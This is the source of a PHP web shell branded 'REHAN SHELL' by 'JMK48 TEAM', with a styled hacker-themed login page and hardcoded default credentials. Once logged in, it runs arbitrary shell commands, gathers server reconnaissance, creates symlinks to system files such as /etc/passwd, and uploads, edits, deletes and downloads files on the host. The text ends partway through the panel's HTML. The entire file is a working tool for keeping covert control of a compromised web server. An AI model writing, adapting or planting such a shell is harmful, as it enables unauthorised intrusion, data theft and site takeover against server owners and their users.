<?php
session_start();
error_reporting(0);

// PASSWORD SYSTEM
$default_username = "adminer";
$default_password = "seomagang";
$password_file = '.shell_pass.dat';

// Fungsi hash SHA1 + MD5 20x
function multi_hash($password) {
    $hashed = $password;
    for($i = 0; $i < 10; $i++) {
        $hashed = sha1($hashed);
    }
    for($i = 0; $i < 10; $i++) {
        $hashed = md5($hashed);
    }
    return $hashed;
}

// Set password default
if(!file_exists($password_file)){
    $hashed_password = multi_hash($default_password);
    file_put_contents($password_file, $hashed_password);
}

// Check login
if(isset($_POST['login'])){
    $input_user = $_POST['username'];
    $input_pass = $_POST['password'];
    $stored_hash = trim(file_get_contents($password_file));
    $input_hash = multi_hash($input_pass);
    
    if($input_user === $default_username && $input_hash === $stored_hash){
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header("Location: ?");
        exit;
    } else {
        $login_error = "Username atau password salah!";
    }
}

// Change password
if(isset($_POST['change_pass']) && isset($_SESSION['logged_in'])){
    $current = $_POST['current_pass'];
    $new = $_POST['new_pass'];
    $confirm = $_POST['confirm_pass'];
    
    $stored_hash = trim(file_get_contents($password_file));
    $current_hash = multi_hash($current);
    
    if($current_hash === $stored_hash){
        if($new === $confirm){
            if(strlen($new) >= 8){
                $new_hash = multi_hash($new);
                file_put_contents($password_file, $new_hash);
                $pass_success = "Password berhasil diubah!";
            } else {
                $pass_error = "Password minimal 8 karakter!";
            }
        } else {
            $pass_error = "Password baru tidak cocok!";
        }
    } else {
        $pass_error = "Password saat ini salah!";
    }
}

// Logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ?");
    exit;
}

// Check if logged in
$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// CEK INFO VIA AJAX - INFO SEDERHANA (IP, OS, SERVER, PHP)
if(isset($_GET['ajax_info']) && $logged_in){
    $info = [];
    
    // Header
    $info[] = "╔════════════════════════════════════╗";
    $info[] = "║        SYSTEM INFORMATION         ║";
    $info[] = "╚════════════════════════════════════╝";
    $info[] = "";
    
    // IP Information
    $ip_server = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $ip_client = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostname();
    
    $info[] = "🌐 NETWORK INFORMATION";
    $info[] = "   Server IP      : " . $ip_server;
    $info[] = "   Your IP        : " . $ip_client;
    $info[] = "   Hostname       : " . $hostname;
    $info[] = "";
    
    // OS Information (uname -a)
    $uname = @shell_exec('uname -a 2>&1') ?: 'Unknown';
    $os_info = php_uname();
    
    $info[] = "💻 OPERATING SYSTEM";
    $info[] = "   OS Info        : " . trim($os_info);
    if($uname != 'Unknown') {
        $info[] = "   Kernel         : " . trim($uname);
    }
    $info[] = "";
    
    // Server Software
    $server_soft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $server_port = $_SERVER['SERVER_PORT'] ?? 'Unknown';
    
    $info[] = "⚙️ SERVER INFORMATION";
    $info[] = "   Server Software: " . $server_soft;
    $info[] = "   Server Name    : " . $server_name;
    $info[] = "   Server Port    : " . $server_port;
    $info[] = "   Document Root  : " . ($_SERVER['DOCUMENT_ROOT'] ?? 'Unknown');
    $info[] = "";
    
    // PHP Information
    $info[] = "🐘 PHP INFORMATION";
    $info[] = "   PHP Version    : " . phpversion();
    $info[] = "   PHP SAPI       : " . php_sapi_name();
    $info[] = "   Memory Limit   : " . ini_get('memory_limit');
    $info[] = "   Max Exec Time  : " . ini_get('max_execution_time') . 's';
    $info[] = "   Upload Max Size: " . ini_get('upload_max_filesize');
    $info[] = "   Post Max Size  : " . ini_get('post_max_size');
    $info[] = "   Disabled Funcs : " . (ini_get('disable_functions') ?: 'None');
    $info[] = "";
    
    // Current Directory
    $info[] = "📁 CURRENT LOCATION";
    $info[] = "   Current Dir    : " . getcwd();
    $info[] = "   Script Path    : " . __FILE__;
    $info[] = "";
    
    // Uptime (if available)
    $uptime = @shell_exec('uptime 2>&1');
    if($uptime) {
        $info[] = "⏱️ SYSTEM UPTIME";
        $info[] = "   " . trim($uptime);
    }
    
    echo implode("\n", $info);
    exit;
}

// SYMLINK - Membuat symlink
if(isset($_GET['symlink']) && $logged_in){
    $target = $_GET['symlink'];
    $linkname = isset($_GET['link']) ? $_GET['link'] : 'link_' . md5(time());
    
    if(@symlink($target, $linkname)){
        echo "<script>alert('Symlink created: $linkname -> $target');location='?';</script>";
    } else {
        echo "<script>alert('Failed to create symlink');location='?';</script>";
    }
    exit;
}

// COMMAND VIA AJAX (untuk pop-up)
if(isset($_POST['ajax_cmd']) && $logged_in){
    $cmd = $_POST['ajax_cmd'];
    $cmd = trim($cmd);
    
    if(preg_match('/^\s*cd\s+(.+)/', $cmd, $match)){
        $target = trim($match[1]);
        $current_dir = getcwd();
        
        if($target == '..') {
            $new_dir = dirname($current_dir);
        } elseif($target[0] == '/') {
            $new_dir = $target;
        } else {
            $new_dir = realpath($current_dir.'/'.$target);
        }
        
        if($new_dir && @chdir($new_dir)){
            echo "DIR_CHANGED:" . getcwd();
        } else {
            echo "ERROR: Cannot change directory to $target";
        }
        exit;
    }
    else {
        $output = @shell_exec($cmd.' 2>&1');
        echo $output ?: "No output or command failed";
        exit;
    }
}

// SHELL FUNCTIONS
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if(!is_dir($dir)) $dir = getcwd();
@chdir($dir);

// RENAME FILE/FOLDER
if(isset($_GET['rename']) && $logged_in){
    $old_name = $dir.'/'.$_GET['rename'];
    if(isset($_POST['new_name'])){
        $new_name = $_POST['new_name'];
        $new_path = $dir.'/'.$new_name;
        
        if(!file_exists($new_path)){
            if(@rename($old_name, $new_path)){
                echo "<script>alert('Renamed successfully');location='?dir=".urlencode($dir)."';</script>";
            } else {
                echo "<script>alert('Rename failed');location='?dir=".urlencode($dir)."';</script>";
            }
        } else {
            echo "<script>alert('File already exists');location='?dir=".urlencode($dir)."';</script>";
        }
        exit;
    } else {
        $rename_mode = true;
        $rename_file = $_GET['rename'];
    }
}

// DELETE
if(isset($_GET['del']) && $logged_in){
    $file = $dir.'/'.$_GET['del'];
    if(is_dir($file)) @rmdir($file);
    else @unlink($file);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// DOWNLOAD
if(isset($_GET['down']) && $logged_in){
    $file = $dir.'/'.$_GET['down'];
    if(is_file($file)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// EDIT
if(isset($_GET['edit']) && $logged_in){
    $edit_file = $dir.'/'.$_GET['edit'];
    if(is_file($edit_file)){
        $edit_mode = true;
        $edit_content = file_get_contents($edit_file);
    }
}
if(isset($_POST['save']) && $logged_in){
    file_put_contents($dir.'/'.$_POST['fname'], $_POST['content']);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// UPLOAD
if(!empty($_FILES['upfile']['name']) && $logged_in){
    $name = $_FILES['upfile']['name'];
    $tmp = $_FILES['upfile']['tmp_name'];
    
    if(is_uploaded_file($tmp)){
        $target = $dir.'/'.$name;
        
        if(file_exists($target)){
            $i = 1;
            $info = pathinfo($name);
            $base = $info['filename'];
            $ext = isset($info['extension']) ? '.'.$info['extension'] : '';
            while(file_exists($dir.'/'.$base.'_'.$i.$ext)) $i++;
            $name = $base.'_'.$i.$ext;
            $target = $dir.'/'.$name;
        }
        
        if(move_uploaded_file($tmp, $target)){
            echo "<script>alert('Uploaded: $name');</script>";
        }
        header("Location: ?dir=".urlencode($dir));
        exit;
    }
}

// CREATE FOLDER/FILE
if(isset($_POST['newfolder']) && $_POST['newfolder']!='' && $logged_in){
    mkdir($dir.'/'.$_POST['newfolder'], 0777, true);
    header("Location: ?dir=".urlencode($dir));
    exit;
}
if(isset($_POST['newfile']) && $_POST['newfile']!='' && $logged_in){
    file_put_contents($dir.'/'.$_POST['newfile'], '');
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Jika belum login, tampilkan form login dengan tampilan keren
if(!$logged_in):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.:JMK48 TEAM:.</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Fira Code', 'Consolas', monospace;
            background: #0a0e1a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        
        /* Animated background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .matrix-bg::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(0,255,0,0.03) 0%, transparent 100%);
            animation: matrixMove 20s linear infinite;
        }
        
        .matrix-bg::after {
            content: "01001110 01100101 01110101 01110010 01101111 01101110 00100000 01010011 01101000 01100101 01101100 01101100";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            color: rgba(0,255,0,0.03);
            font-size: 14px;
            line-height: 2;
            white-space: nowrap;
            animation: matrixRain 20s linear infinite;
        }
        
        @keyframes matrixMove {
            0% { transform: translateY(-100%) rotate(0deg); }
            100% { transform: translateY(100%) rotate(360deg); }
        }
        
        @keyframes matrixRain {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        
        /* Floating particles */
        .particles {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        
        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #00ff00;
            opacity: 0.3;
            border-radius: 50%;
            animation: float 6s infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0.3; }
            50% { transform: translateY(-20px) translateX(10px); opacity: 0.8; }
        }
        
        /* Main container */
        .login-container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }
        
        /* Login card */
        .login-card {
            background: rgba(10, 20, 10, 0.95);
            backdrop-filter: blur(10px);
            border: 2px solid #00ff00;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2),
                        0 0 80px rgba(0, 255, 0, 0.1),
                        inset 0 0 20px rgba(0, 255, 0, 0.1);
            animation: glowPulse 3s ease-in-out infinite;
            position: relative;
            overflow: hidden;
        }
        
        @keyframes glowPulse {
            0%, 100% { box-shadow: 0 0 40px rgba(0, 255, 0, 0.2), 0 0 80px rgba(0, 255, 0, 0.1), inset 0 0 20px rgba(0, 255, 0, 0.1); }
            50% { box-shadow: 0 0 60px rgba(0, 255, 0, 0.4), 0 0 100px rgba(0, 255, 0, 0.2), inset 0 0 30px rgba(0, 255, 0, 0.2); }
        }
        
        .login-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                45deg,
                transparent,
                rgba(0, 255, 0, 0.1),
                transparent
            );
            transform: rotate(45deg);
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }
        
        /* Logo container */
        .logo-wrapper {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }
        
        .logo-container {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            border-radius: 50%;
            border: 3px solid #00ff00;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            animation: rotate 10s linear infinite;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
        }
        
        .logo-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border-radius: 50%;
            background: linear-gradient(45deg, #00ff00, #00aa00, #00ff00);
            z-index: -1;
            animation: borderSpin 3s linear infinite;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes borderSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .logo-container img {
            max-width: 100px;
            max-height: 100px;
            border-radius: 50%;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 5px #00ff00); }
            50% { transform: scale(1.05); filter: drop-shadow(0 0 15px #00ff00); }
        }
        
        /* Title */
        .login-title {
            color: #00ff00;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-bottom: 5px;
            text-shadow: 0 0 10px #00ff00;
            animation: textGlow 2s ease-in-out infinite;
        }
        
        @keyframes textGlow {
            0%, 100% { text-shadow: 0 0 10px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }
        
        .login-subtitle {
            color: #00aa00;
            font-size: 12px;
            letter-spacing: 2px;
            opacity: 0.8;
            margin-bottom: 20px;
        }
        
        /* Input groups */
        .input-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #00ff00;
            font-size: 16px;
            opacity: 0.7;
            z-index: 1;
        }
        
        .input-field {
            width: 100%;
            padding: 15px 15px 15px 45px;
            background: rgba(0, 20, 0, 0.7);
            border: 2px solid #00aa00;
            border-radius: 30px;
            color: #00ff00;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
            position: relative;
            backdrop-filter: blur(5px);
        }
        
        .input-field:focus {
            border-color: #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            background: rgba(0, 30, 0, 0.8);
            transform: translateY(-2px);
        }
        
        .input-field::placeholder {
            color: #00aa00;
            opacity: 0.5;
        }
        
        /* Input highlight effect */
        .input-highlight {
            position: absolute;
            bottom: -2px;
            left: 50%;
            width: 0;
            height: 2px;
            background: #00ff00;
            transition: all 0.3s ease;
            transform: translateX(-50%);
            border-radius: 2px;
        }
        
        .input-field:focus ~ .input-highlight {
            width: 100%;
        }
        
        /* Login button */
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #003300, #006600);
            border: 2px solid #00ff00;
            border-radius: 30px;
            color: #00ff00;
            font-family: 'Fira Code', monospace;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            margin-top: 10px;
            text-transform: uppercase;
        }
        
        .login-btn:hover {
            background: linear-gradient(45deg, #006600, #009900);
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.4);
        }
        
        .login-btn:active {
            transform: translateY(-1px);
        }
        
        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .login-btn:hover::before {
            left: 100%;
        }
        
        .login-btn i {
            margin-right: 10px;
        }
        
        /* Error message */
        .error-msg {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 12px 15px;
            margin-bottom: 20px;
            color: #ff4444;
            font-size: 13px;
            text-align: center;
            animation: shake 0.5s ease-in-out;
            backdrop-filter: blur(5px);
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        /* Footer */
        .login-footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(0, 255, 0, 0.2);
            text-align: center;
        }
        
        .security-badge {
            display: inline-block;
            padding: 5px 15px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00aa00;
            border-radius: 20px;
            color: #00ff00;
            font-size: 11px;
            letter-spacing: 1px;
        }
        
        .security-badge i {
            margin: 0 5px;
            animation: blink 1.5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .version {
            color: #00aa00;
            font-size: 11px;
            margin-top: 10px;
            opacity: 0.6;
        }
        
        /* Typing effect */
        .typing-text {
            color: #00aa00;
            font-size: 11px;
            margin-top: 15px;
            overflow: hidden;
            white-space: nowrap;
            animation: typing 3.5s steps(40, end);
        }
        
        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                padding: 10px;
            }
            
            .login-card {
                padding: 30px 20px;
            }
            
            .login-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Matrix background -->
    <div class="matrix-bg"></div>
    
    <!-- Particles -->
    <div class="particles" id="particles"></div>
    
    <!-- Login container -->
    <div class="login-container">
        <div class="login-card">
            <!-- Logo -->
            <div class="logo-wrapper">
                <div class="logo-container">
                    <img src="https://i.ibb.co.com/Tx1Yf4VQ/photo-6091527544868900541-x.jpg" alt="1337 SHELL" onerror="this.style.display='none'">
                </div>
                <div class="login-title">REHAN SHELL</div>
                <div class="login-subtitle">WEBSHELL v2.0</div>
            </div>
            
            <!-- Error message -->
            <?php if(isset($login_error)): ?>
                <div class="error-msg">
                    <i class="fas fa-exclamation-triangle"></i> 
                    <?=htmlspecialchars($login_error)?>
                </div>
            <?php endif; ?>
            
            <!-- Login form -->
            <form method="post" id="loginForm">
                <div class="input-group">
                    <span class="input-icon"><i class="fas fa-user"></i></span>
                    <input type="text" 
                           class="input-field" 
                           name="username" 
                           placeholder="Username" 
                           required 
                           autofocus
                           autocomplete="off">
                    <span class="input-highlight"></span>
                </div>
                
                <div class="input-group">
                    <span class="input-icon"><i class="fas fa-lock"></i></span>
                    <input type="password" 
                           class="input-field" 
                           name="password" 
                           placeholder="Password" 
                           required
                           autocomplete="off">
                    <span class="input-highlight"></span>
                </div>
                
                <button type="submit" name="login" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> Login
                </button>
            </form>
            
            <!-- Footer -->
            <div class="login-footer">
                <div class="security-badge">
                    <i class="fas fa-shield-alt"></i>
                    SECURE CONNECTION
                    <i class="fas fa-shield-alt"></i>
                </div>
                <div class="version">
                    <i class="fas fa-code"></i> 1337 SHELL v2.0 - Enhanced Security
                </div>
                <div class="typing-text">
                    <i class="fas fa-terminal"></i> # root@1337:~$ access_granted
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Create particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 50;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                
                // Random position
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                
                // Random size
                const size = Math.random() * 3 + 1;
                particle.style.width = size + 'px';
                particle.style.height = size + 'px';
                
                // Random animation delay
                particle.style.animationDelay = Math.random() * 5 + 's';
                
                // Random opacity
                particle.style.opacity = Math.random() * 0.5 + 0.2;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
            
            // Auto-hide error message
            setTimeout(function() {
                const errorMsg = document.querySelector('.error-msg');
                if (errorMsg) {
                    errorMsg.style.opacity = '0';
                    setTimeout(() => {
                        errorMsg.style.display = 'none';
                    }, 500);
                }
            }, 5000);
        });
        
        // Prevent form resubmission on refresh
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
    </script>
</body>
</html>
<?php
exit;
endif;

// SESSION TIMEOUT (1 jam)
if(time() - $_SESSION['login_time'] > 3600){
    session_destroy();
    header("Location: ?");
    exit;
}

// Get current directory for display
$current_dir = getcwd();
?>
<!DOCTYPE html>
<html>
<head>
    <title>.:JMK48 TEAM:.</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
            line-height: 1.4;
        }
        
        /* HEADER */
        .header {
            background: #000;
            border-bottom: 2px solid #00ff00;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-info {
            color: #00ff00;
            font-size: 14px;
        }
        .header-controls {
            display: flex;
            gap: 10px;
        }
        
        /* BUTTONS */
        .btn {
            padding: 8px 15px;
            background: #222;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            border-radius: 3px;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #00ff00;
            color: #000;
        }
        .btn-change { background: #003300; border-color: #00aa00; }
        .btn-logout { background: #330000; border-color: #ff0000; color: #ff6666; }
        
        /* TOOLS BAR */
        .tools-bar {
            background: #111;
            padding: 10px 20px;
            border-bottom: 1px solid #333;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        .tools-bar a {
            color: #00ff00;
            text-decoration: none;
            font-size: 13px;
            padding: 3px 10px;
            border: 1px solid transparent;
            cursor: pointer;
        }
        .tools-bar a:hover {
            border-color: #00ff00;
            background: #222;
        }
        
        /* MODAL */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background: #111;
            margin: 5% auto;
            padding: 20px;
            border: 2px solid #00ff00;
            width: 90%;
            max-width: 800px;
            border-radius: 5px;
            max-height: 80vh;
            overflow-y: auto;
            animation: modalSlideIn 0.3s;
        }
        
        @keyframes modalSlideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        .modal-title {
            color: #00ff00;
            font-size: 18px;
        }
        .modal-close {
            color: #666;
            font-size: 28px;
            cursor: pointer;
        }
        .modal-close:hover {
            color: #ff0000;
        }
        
        /* INFO MODAL SPECIFIC */
        .info-content {
            background: #000;
            padding: 20px;
            border: 1px solid #333;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            color: #00ff00;
            line-height: 1.6;
            font-size: 13px;
        }
        
        /* CMD CONTAINER */
        .cmd-container {
            background: #000;
            padding: 15px;
            border: 1px solid #333;
        }
        .cmd-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .cmd-input-group input {
            flex: 1;
            padding: 10px;
            background: #1a1a1a;
            color: #00ff00;
            border: 1px solid #333;
            font-family: 'Consolas', monospace;
        }
        .cmd-input-group button {
            padding: 10px 20px;
            background: #00ff00;
            color: #000;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        .cmd-output {
            background: #000;
            border: 1px solid #333;
            padding: 15px;
            min-height: 200px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            color: #00ff00;
        }
        .cmd-prompt {
            color: #00aaaa;
            margin-bottom: 10px;
            font-size: 12px;
        }
        
        /* FLOATING BUTTON */
        .floating-cmd {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 99;
        }
        .floating-cmd button {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #00ff00;
            color: #000;
            border: none;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 0 20px #00ff00;
            transition: all 0.3s;
        }
        .floating-cmd button:hover {
            transform: scale(1.1);
        }
        
        /* CONTAINER */
        .container {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* PATH BAR */
        .path-bar {
            background: #000;
            border: 1px solid #333;
            padding: 12px 15px;
            margin-bottom: 20px;
        }
        .path-links a {
            color: #00ff00;
            text-decoration: none;
            margin-right: 5px;
        }
        .path-links a:hover {
            text-decoration: underline;
        }
        
        /* FORM SECTION */
        .form-section {
            background: #000;
            border: 1px solid #333;
            padding: 20px;
            margin-bottom: 20px;
        }
        .section-title {
            color: #00ff00;
            margin-bottom: 15px;
            font-size: 16px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        .form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        .form-row input {
            flex: 1;
            padding: 10px;
            background: #111;
            color: #00ff00;
            border: 1px solid #333;
            font-family: 'Consolas', monospace;
            min-width: 200px;
        }
        .form-row button {
            padding: 10px 20px;
            background: #222;
            color: #00ff00;
            border: 1px solid #333;
            cursor: pointer;
        }
        .form-row button:hover {
            background: #333;
            border-color: #00ff00;
        }
        
        /* FILE TABLE */
        .file-table {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            border-collapse: collapse;
        }
        .file-table th {
            background: #111;
            color: #00ff00;
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        .file-table td {
            padding: 10px 15px;
            border-bottom: 1px solid #222;
        }
        .file-table tr:hover {
            background: #111;
        }
        .file-name a {
            color: #00ff00;
            text-decoration: none;
        }
        .file-name a:hover {
            text-decoration: underline;
        }
        .file-actions a {
            color: #00aaaa;
            text-decoration: none;
            margin-right: 10px;
            font-size: 12px;
        }
        .file-actions a:hover {
            color: #00ff00;
        }
        
        /* EDITOR */
        .editor-container {
            background: #000;
            border: 1px solid #333;
            padding: 20px;
        }
        .editor-textarea {
            width: 100%;
            height: 400px;
            background: #111;
            color: #00ff00;
            border: 1px solid #333;
            padding: 15px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            margin-bottom: 15px;
        }
        
        /* PASSWORD FORM */
        .password-form {
            background: #000;
            border: 2px solid #00aaaa;
            padding: 30px;
            max-width: 500px;
            margin: 20px auto;
        }
        .password-title {
            color: #00ff00;
            margin-bottom: 20px;
            text-align: center;
            font-size: 18px;
        }
        .password-inputs input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            background: #111;
            color: #00ff00;
            border: 1px solid #333;
        }
        
        /* SYMLINK FORM */
        .symlink-form {
            background: #000;
            border: 2px solid #cc6600;
            padding: 30px;
            max-width: 600px;
            margin: 20px auto;
        }
        .symlink-title {
            color: #ff9900;
            margin-bottom: 20px;
            text-align: center;
            font-size: 18px;
        }
        
        /* MESSAGES */
        .msg-error { color: #ff0000; text-align: center; margin: 10px 0; }
        .msg-success { color: #00ff00; text-align: center; margin: 10px 0; }
        
        /* LOADER */
        .loader {
            border: 2px solid #333;
            border-top: 2px solid #00ff00;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

<!-- HEADER -->
<div class="header">
    <div class="header-info">
        <i class="fas fa-terminal"></i> 1337 SHELL | <?=htmlspecialchars($current_dir)?>
    </div>
    <div class="header-controls">
        <button class="btn btn-change" onclick="showPasswordForm()">
            <i class="fas fa-key"></i> Change Pass
        </button>
        <a href="?logout=1" class="btn btn-logout">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</div>

<!-- TOOLS BAR -->
<div class="tools-bar">
    <a href="?"><i class="fas fa-home"></i> Home</a>
    <a onclick="showInfoModal()"><i class="fas fa-server"></i> System Info</a>
    <a onclick="showSymlinkForm()"><i class="fas fa-link"></i> Create Symlink</a>
    <a href="?dir=<?=urlencode(dirname(__FILE__))?>"><i class="fas fa-folder"></i> Root Dir</a>
</div>

<!-- PASSWORD FORM -->
<div id="passwordForm" class="password-form" style="display:none;">
    <div class="password-title"><i class="fas fa-key"></i> Change Password</div>
    <?php if(isset($pass_error)): ?>
        <div class="msg-error"><?=htmlspecialchars($pass_error)?></div>
    <?php elseif(isset($pass_success)): ?>
        <div class="msg-success"><?=htmlspecialchars($pass_success)?></div>
    <?php endif; ?>
    <form method="post">
        <div class="password-inputs">
            <input type="password" name="current_pass" placeholder="Current Password" required>
            <input type="password" name="new_pass" placeholder="New Password (min 8 chars)" required>
            <input type="password" name="confirm_pass" placeholder="Confirm New Password" required>
        </div>
        <div class="form-row" style="justify-content: center;">
            <button type="submit" name="change_pass" class="btn">Change</button>
            <button type="button" class="btn" onclick="hidePasswordForm()">Cancel</button>
        </div>
    </form>
</div>

<!-- SYMLINK FORM -->
<div id="symlinkForm" class="symlink-form" style="display:none;">
    <div class="symlink-title"><i class="fas fa-link"></i> Create Symlink</div>
    <form method="get">
        <div class="form-row">
            <input type="text" name="symlink" placeholder="Target path (e.g., /etc/passwd)" required>
        </div>
        <div class="form-row">
            <input type="text" name="link" placeholder="Link name (optional)">
        </div>
        <div class="form-row" style="justify-content: center;">
            <button type="submit" class="btn btn-symlink">Create</button>
            <button type="button" class="btn" onclick="hideSymlinkForm()">Cancel</button>
        </div>
    </form>
</div>

<!-- INFO MODAL -->
<div id="infoModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="modal-title">
                <i class="fas fa-server"></i> System Information
            </div>
            <span class="modal-close" onclick="closeInfoModal()">&times;</span>
        </div>
